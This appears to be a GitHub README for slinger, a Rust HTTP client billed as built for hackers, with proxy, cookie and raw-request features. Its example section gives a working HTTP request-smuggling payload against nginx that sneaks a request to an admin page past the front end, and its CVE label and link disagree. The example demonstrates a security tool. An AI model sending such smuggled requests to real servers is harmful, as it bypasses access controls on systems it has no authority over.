<!-- Improved compatibility of back to top link: See: https://github.com/emo-crab/slinger/pull/73 -->
<a name="readme-top"></a>
<!--
*** Thanks for checking out the slinger. If you have a suggestion
*** that would make this better, please fork the repo and create a pull request
*** or simply open an issue with the tag "enhancement".
*** Don't forget to give the project a star!
*** Thanks again! Now go create something AMAZING! :D
-->



<!-- PROJECT SHIELDS -->
<!--
*** I'm using markdown "reference style" links for readability.
*** Reference links are enclosed in brackets [ ] instead of parentheses ( ).
*** See the bottom of this document for the declaration of the reference variables
*** for contributors-url, forks-url, etc. This is an optional, concise syntax you may use.
*** https://www.markdownguide.org/basic-syntax/#reference-style-links
-->
[![Contributors][contributors-shield]][contributors-url]
[![Forks][forks-shield]][forks-url]
[![Stargazers][stars-shield]][stars-url]
[![Issues][issues-shield]][issues-url]
[![MIT License][license-shield]][license-url]
[![crates io][crates-shield]][crates-url]




<!-- PROJECT LOGO -->
<br />
<div align="center">
  <a href="https://github.com/emo-crab/slinger">
    <img src="images/logo.svg" alt="Logo">
  </a>

<h3 align="center">slinger(投石器)</h3>

  <p align="center">
    An HTTP Client for Rust designed for hackers.
    <br />
    <a href="https://github.com/emo-crab/slinger"><strong>Explore the docs »</strong></a>
    <br />
    <br />
    <a href="https://github.com/emo-crab/slinger">View Demo</a>
    ·
    <a href="https://github.com/emo-crab/slinger/issues">Report Bug</a>
    ·
    <a href="https://github.com/emo-crab/slinger/issues">Request Feature</a>
  </p>
</div>

<!-- ABOUT THE PROJECT -->

## About The Project

![Product Name Screen Shot][product-screenshot]

- customizable redirect policy
- http/https and socks5/socks5h proxies
- cookie store
- raw socket request
- HTTPS via tls

<p align="right">(<a href="#readme-top">back to top</a>)</p>



<!-- GETTING STARTED -->

## Getting Started

This example enables some optional features, so your `Cargo.toml` could look like this:

```toml
[dependencies]
slinger = { version = "0.1.0", features = ["serde", "cookie", "charset", "tls", "gzip"] }
```

And then the code:

```rust,no_run
fn main() -> Result<(), Box<dyn std::error::Error>> {
  let resp = slinger::get("https://httpbin.org/get")?;
  println!("{:?}", resp.text());
  Ok(())
}
```

<!-- USAGE EXAMPLES -->

## Example

- Nginx - Http Smuggling [CVE-2019-20372](https://scap.kali-team.cn/cve/CVE-2020-11724)

```rust
use std::io::BufRead;
use slinger::{ClientBuilder, HTTPRecord};

/// CVE-2020-11724
/// when you're using BurpSuite proxy need **disabled** "set **Connection** header on incoming request"
const RAW: &[u8] = b"GET /test1 HTTP/1.1
Host: 192.168.83.196:8081
Content-Length: 42
Transfer-Encoding: chunked

0

GET /test1 HTTP/1.1
Host: 192.168.83.196:8081
X: GET http://192.168.83.1:8080/admin.jsp HTTP/1.0

";

fn main() -> Result<(), Box<dyn std::error::Error>> {
  // let proxy = slinger::Proxy::parse("http://127.0.0.1:8080").unwrap();
  let client = ClientBuilder::new().build().unwrap();
  let mut raw = Vec::new();
  // replace \n to \r\n
  for line in RAW.lines() {
    match line {
      Ok(l) => {
        raw.extend(l.as_bytes());
        raw.extend(b"\r\n")
      }
      Err(err) => {
        println!("{:?}", err);
      }
    }
  }
  let resp = client.raw("http://127.0.0.1:9015/", raw, true).send()?;
  let record = resp.extensions().get::<Vec<HTTPRecord>>().unwrap();
  println!("{:?}", record);
  Ok(())
}

```

_For more examples, please refer to the [example](https://github.com/emo-crab/slinger/tree/main/examples)_

<p align="right">(<a href="#readme-top">back to top</a>)</p>

<!-- CONTRIBUTING -->

## Contributing

Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any
contributions you make are **greatly appreciated**.

If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also
simply open an issue with the tag "enhancement".
Don't forget to give the project a star! Thanks again!

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the Branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

<p align="right">(<a href="#readme-top">back to top</a>)</p>



<!-- LICENSE -->

## License

Distributed under the `GPL-3.0-only` License. See `LICENSE` for more information.

<p align="right">(<a href="#readme-top">back to top</a>)</p>



<!-- CONTACT -->

## Contact

Your Name - [@Kali_Team](https://twitter.com/Kali_Team) - root@kali-team.cn

Project Link: [https://github.com/emo-crab/slinger](https://github.com/emo-crab/slinger)

<p align="right">(<a href="#readme-top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->

## Acknowledgments

* [reqwest](https://github.com/seanmonstar/reqwest)

<p align="right">(<a href="#readme-top">back to top</a>)</p>



<!-- MARKDOWN LINKS & IMAGES -->
<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->

[contributors-shield]: https://img.shields.io/github/contributors/emo-crab/slinger.svg?style=for-the-badge

[contributors-url]: https://github.com/emo-crab/slinger/graphs/contributors

[forks-shield]: https://img.shields.io/github/forks/emo-crab/slinger.svg?style=for-the-badge

[forks-url]: https://github.com/emo-crab/slinger/network/members

[stars-shield]: https://img.shields.io/github/stars/emo-crab/slinger.svg?style=for-the-badge

[stars-url]: https://github.com/emo-crab/slinger/stargazers

[issues-shield]: https://img.shields.io/github/issues/emo-crab/slinger.svg?style=for-the-badge

[issues-url]: https://github.com/emo-crab/slinger/issues

[license-shield]: https://img.shields.io/github/license/emo-crab/slinger.svg?style=for-the-badge

[license-url]: https://github.com/emo-crab/slinger/blob/master/LICENSE.txt

[product-screenshot]: images/screenshot.png

[crates-shield]: https://img.shields.io/crates/v/slinger.svg?style=for-the-badge

[crates-url]: https://crates.io/crates/slinger
